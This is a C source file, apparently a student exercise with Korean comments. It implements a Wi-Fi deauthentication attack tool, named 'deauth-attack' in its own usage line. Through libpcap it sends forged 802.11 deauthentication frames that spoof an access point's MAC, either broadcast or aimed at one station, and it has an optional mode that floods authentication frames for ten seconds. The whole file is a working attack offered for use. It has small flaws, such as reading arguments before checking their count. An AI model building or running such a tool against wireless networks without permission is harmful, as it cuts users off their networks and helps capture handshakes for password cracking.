#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <time.h>
#include <signal.h>  // 시그널 관련 헤더 추가

#include "deauth.h"

void usage();
void AP_broadcast_frame(struct Packet *packet);
void AP_unicast_frame(struct Packet *packet, char *station_mac);
void Station_unicast_frame(struct Packet *packet, char *ap_mac, char *station_mac);

void auth_init(struct Auth_Packet *packet, char *ap_mac, char *station_mac);
void initPacket(struct Packet *packet, char *ap_mac);
void macStringToUint8(char *mac_string, uint8_t *ap_mac);
void handleSignal(int signal);
void cleanup(pcap_t *handle);

pcap_t *global_handle;  // 전역으로 pcap 핸들 선언

int main(int argc, char *argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }

    char *interfaceName = argv[1];
    char *ap_mac = argv[2];
    char *station_mac = argv[3];
    char *auth = argv[4];
    bool mode_flag = true;

    struct Packet packet;
    struct Auth_Packet auth_packet;

    initPacket(&packet, argv[2]);
    if (argc == 3) {
        AP_broadcast_frame(&packet);
        printf("AP_Broadcast Mode\n");
    } else if (argc == 4) {
        AP_unicast_frame(&packet, argv[3]);
        printf("AP_unicast_frame Mode\n");
    } else if (auth != NULL) {
        if (strcmp(argv[4], "-auth") == 0) {
            printf("Turn Auth mode\n");
            auth_init(&auth_packet, argv[2], argv[3]);
            mode_flag = false;
        } else {
            usage();
        }
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interfaceName, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interfaceName, errbuf);
        return -1;
    }

    // 전역 변수에 pcap 핸들 할당
    global_handle = handle;

    // 시그널 핸들러 등록
    signal(SIGINT, handleSignal);

    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < 10) {
        // suspend(SIGINT, handle);

        // deauthentication 공격인 경우
        if (mode_flag) {
            if (pcap_sendpacket(handle, (unsigned char *)&packet, sizeof(packet)) != 0) {
                printf("Deauth_frame send fail\n");
                cleanup(handle);
                exit(-1);
            }
        } else {
            if (pcap_sendpacket(handle, (unsigned char *)&auth_packet, sizeof(auth_packet)) != 0) {
                printf("auth_frame send fail");
                cleanup(handle);
                exit(-1);
            }
        }

        sleep(1); // or usleep(10000); ?
    }

    cleanup(handle);
    return 0;
}

void usage() {
    printf("Syntax is incorrect.\n");
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void initPacket(struct Packet *packet, char *ap_mac) {
    memset(packet, 0, sizeof(struct Packet));
    packet->radiotap.it_len = 0x0018;
    packet->deauth.type = 0xc0;
    macStringToUint8(ap_mac, packet->deauth.source_address);
    macStringToUint8(ap_mac, packet->deauth.bssid);
    packet->fixed.reason_code = 0x0007;
}

void AP_broadcast_frame(struct Packet *packet) {
    memset(packet->deauth.destination_address, 0xFF, 6);
}

// AP가 특정 Station에게 연결을 끊으라고 할 때
void AP_unicast_frame(struct Packet *packet, char *station_mac) {
    macStringToUint8(station_mac, packet->deauth.destination_address);
}

// 특정 Station이 AP에게 연결을 끊겠다라고 할 때
void Station_unicast_frame(struct Packet *packet, char *ap_mac, char *station_mac) {
    // src mac을 station mac으로
    macStringToUint8(station_mac, packet->deauth.source_address);
    // dst mac을 ap mac으로
    macStringToUint8(ap_mac, packet->deauth.destination_address);
}

// --auth 옵션 들어가 있으면 Auth패킷만 계속 날려서 교환 초기화 하는건가?
void auth_init(struct Auth_Packet *auth_packet, char *ap_mac, char *station_mac) {
    memset(auth_packet, 0, sizeof(struct Auth_Packet));
    auth_packet->radiotap.it_len = 0x0018;
    auth_packet->auth.type = 0xb0;

    macStringToUint8(station_mac, auth_packet->auth.source_address);
    macStringToUint8(ap_mac, auth_packet->auth.destination_address);
    macStringToUint8(ap_mac, auth_packet->auth.bssid);

    auth_packet->Auth_Parameter.SEQ = 0x0001;
}

void macStringToUint8(char *mac_string, uint8_t *ap_mac) {
    sscanf(mac_string, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
           &ap_mac[0], &ap_mac[1], &ap_mac[2],
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);
}

void handleSignal(int signal) {
    printf("Entered Ctrl+C, exit program\n");
    cleanup(global_handle);
    exit(0);
}

void cleanup(pcap_t *handle) {
    printf("pcap close!\n");
    pcap_close(handle);
}
